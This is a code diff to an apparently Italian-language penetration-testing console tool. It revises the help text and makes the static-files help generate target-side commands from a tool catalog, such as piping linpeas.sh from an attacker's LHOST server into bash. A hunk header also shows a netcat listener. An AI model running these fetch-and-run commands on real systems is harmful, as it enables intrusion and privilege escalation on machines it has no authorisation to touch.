@@ -217,26 +217,17 @@ def print_tool_entry(tool: ToolEntry, index: int | None = None) -> None:
 def print_help_text() -> None:
     print()
     print("Comandi disponibili:")
-    print("  sealsay [testo]   Stampa un messaggio in stile cowsay con il sealion")
     print("  list               Elenca i tool disponibili")
-    print("  search <query>     Cerca tool per nome o testo")
     print("  use <nome|num>     Seleziona un tool")
     print("  install [nome]     Installa il tool selezionato o specificato")
-    print("  vuln <protocollo>  Mostra vulnerabilità e tool per un protocollo")
-    print("  vuln list          Elenca i protocolli disponibili")
-    print("  vuln *             Elenca i protocolli disponibili")
-    print("  notes <argomento>  Mostra una nota/guida (es. footprinting)")
-    print("  notes list         Elenca le note disponibili")
+    print("  search <query>     Cerca tool per nome o testo")
     print("  find <parola>      Cerca un testo in vuln, tool e notes")
-    print("  serve on           Avvia il server HTTP di delivery in background")
-    print("  serve off          Arresta il server HTTP")
-    print("  serve fetch        Scarica linpeas, winpeas, pspy e altri tool")
-    print("  serve list         Elenca i file in static/")
-    print("  serve status       Mostra lo stato del server")
-    print("  serve help [cat]   Guida: upgrade (u), rev (r), sh, static (s)")
-    print("  help               Mostra questo aiuto")
+    print("  vuln <protocollo>  Mostra cheatsheet  (vuln list per elenco)")
+    print("  notes <argomento>  Mostra una guida    (notes list per elenco)")
+    print("  serve <azione>     Server HTTP di delivery (serve help per dettagli)")
+    print("  sealsay [testo]    Stampa un messaggio in stile cowsay")
     print("  back               Torna alla console principale")
-    print("  exit               Esci da " + APP_NAME)
+    print("  help               Mostra questo aiuto")
     print()
     print("  \033[1mESC\033[0m                Esci da " + APP_NAME)
     print("  \033[1mCtrl+C\033[0m             \033[95m~spin~\033[0m")
@@ -1178,7 +1169,13 @@ nc -lvnp 4444
 
 
 def _serve_help_static() -> None:
-    from http_server import TOOL_CATALOG, STATIC_ROOT
+    from http_server import TOOL_CATALOG, STATIC_ROOT, _lhost, _server
+    if _server is not None:
+        port = _server.server_address[1]
+        base = f"http://{_lhost}:{port}"
+    else:
+        base = "http://<LHOST>:8000"
+
     lines = ["# static/ — File Statici\n"]
     lines.append("Cartella che il server serve come download diretto.")
     lines.append("Qualsiasi file dentro `static/` diventa scaricabile via HTTP.\n")
@@ -1190,16 +1187,15 @@ def _serve_help_static() -> None:
     lines.append("| `serve list` | Mostra file e dimensioni |")
     lines.append("| `cp file static/` | Aggiungi un file manualmente |\n")
     lines.append("## Catalogo tool\n")
-    lines.append("| File | Descrizione |")
-    lines.append("|------|-------------|")
-    for entry in TOOL_CATALOG:
-        lines.append(f"| `{entry['name']}` | {entry['desc']} |")
-    lines.append("")
-    lines.append("## Dal target\n")
     lines.append("```bash")
-    lines.append("curl http://<LHOST>:8000/linpeas.sh | bash")
-    lines.append("curl http://<LHOST>:8000/pspy64 -o pspy && chmod +x pspy")
-    lines.append("curl http://<LHOST>:8000/winPEASx64.exe -o wp.exe")
+    for entry in TOOL_CATALOG:
+        name = entry["name"]
+        if name.endswith(".sh"):
+            lines.append(f"curl {base}/{name} | bash")
+        elif name.endswith(".exe"):
+            lines.append(f"curl {base}/{name} -o {name}")
+        else:
+            lines.append(f"curl {base}/{name} -o {name} && chmod +x {name}")
     lines.append("```")
     render_markdown("\n".join(lines))
 
